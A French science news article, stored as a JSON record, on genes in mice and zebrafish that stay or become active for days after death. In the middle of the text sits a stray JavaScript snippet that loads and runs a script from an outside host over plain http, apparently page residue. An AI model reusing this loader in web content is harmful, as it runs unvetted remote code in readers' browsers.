{"title": "Les genes zombie se reveillent apres la mort", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-06-17", "content": "Le 7 juin dernier, nous decrivions le projet controverse de l'entreprise Bioquark qui envisage de restaurer une activite neuronale chez des personnes en mort cerebrale. Cet essai clinique qui vise a << ressusciter les morts >> utiliserait plusieurs techniques comme l'injection de cellules souches et la stimulation nerveuse. Or, l'an passe, des chercheurs ont demontre l'existence d'une certaine vie genetique apres la mort : chez le poisson et la souris, des centaines de genes seraient actifs apres la mort, meme au bout de plusieurs jours. Ces travaux montraient que la machinerie cellulaire ne s'arrete pas brutalement apres le deces, voire que certains genes sont actives. Article publie le 26 juin 2016 Quand le coeur et le  cerveau  cessent de fonctionner, que la respiration et le systeme circulatoire s'arretent, l'individu est declare comme  mort . Mais si le corps ne fonctionne plus, cela ne signifie pas forcement que toute vie s'est arretee... C'est ce que suggerent deux articles parus recemment en ligne qui apportent les preuves d'une vie biologique apres la mort.  Pour cette recherche, l'equipe du microbiologiste Peter Noble, de l'universite de Washington, a etudie l'activite des  genes  chez la souris et le poisson-zebre. Ils voulaient savoir si les genes reduisaient progressivement leur activite apres le  deces , s'ils s'arretaient soudainement ou si certains etaient actives. Les chercheurs ont etudie une periode de deux jours chez les  rongeurs  et de quatre jours chez les poissons-zebres. Resultat : les genes ne s'eteignaient pas tous progressivement apres la mort ; a l'inverse, des centaines de genes voyaient leur activite s'accelerer ! La plupart augmentaient leur activite dans les premieres 24 heures mais certains genes du  poisson  etaient toujours actifs au bout de quatre jours. En tout, ils ont identifie plus de 1.000 genes du  poisson  et de la souris qui fonctionnaient toujours des jours apres le deces et qui avaient meme une activite augmentee : 515 genes de la souris fonctionnaient encore 24 heures apres le deces et 548 etaient toujours en etat de marche quatre jours apres le deces chez le poisson-zebre.  L'etude de l'expression des genes  post-mortem  pourrait permettre de determiner l'heure d'un deces dans le cadre d'une enquete criminelle. (c) Photographee.eu, Shutterstock                               Des points communs genetiques entre la mort et le debut de la vie Beaucoup de ces genes etaient benefiques dans l'urgence : ils stimulaient l' inflammation , le  systeme immunitaire  ou luttaient contre le  stress . Mais d'autres etaient plus surprenants : certains genes servaient a la construction de l' embryon  et ne s'exprimaient plus a la naissance, pour finalement ne se reveiller qu'apres la mort ! Les cellules de l'organisme, juste apres la mort, seraient donc dans une situation proche de celles d'un embryon qui se developpe rapidement. Ces tentatives desesperees pour reanimer un corps mort se rapprochent donc de la construction d'un nouvel organisme, meme si le travail effectue par ces genes ne pouvait pas ramener l'organisme a la vie.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Mais tous ces genes qui se reveillaient n'etaient pas forcement benefiques : certains favorisaient la croissance de  cancers , ce qui peut avoir des implications pour les  greffes d'organes  issus de cadavres. En effet, des etudes ont montre que les personnes qui recoivent un  greffon  ont plus de risque de developper un cancer. Ce serait du aux medicaments immunosuppresseurs administres aux patients pour eviter le  rejet de greffe . Mais des genes actifs  post-mortem  pourraient aussi expliquer ce risque cancereux. Une des  applications  possibles de ce travail, developpees dans l'un des deux articles parus sur  Biorkhiv , concerne la  criminologie  : l'etude de l'activite des genes  post-mortem  pourrait aider a dater un deces.  Il faut noter cependant que ces  resultats publies en ligne  ne font pas l'objet d'une publication avec un comite de lecture. En definitive, comme l'explique Peter Noble dans  Science magazine , ce que l'on peut retenir de ces travaux c'est que nous pouvons encore beaucoup apprendre de la vie en etudiant la mort... Interview : le transhumanisme peut-il rendre l'Homme immortel ?                       La course vers l'Homme augmente est en marche. Auparavant simple fantasme, le post-humain serait, selon certains, sur le point de naitre. Futura-Sciences a rencontre Jean-Claude Heudin, directeur du laboratoire de recherche de l'IIM (institut de l'Internet et du multimedia) afin qu'il nous parle plus en detail du transhumanisme.                                       ", "theme": "sante"}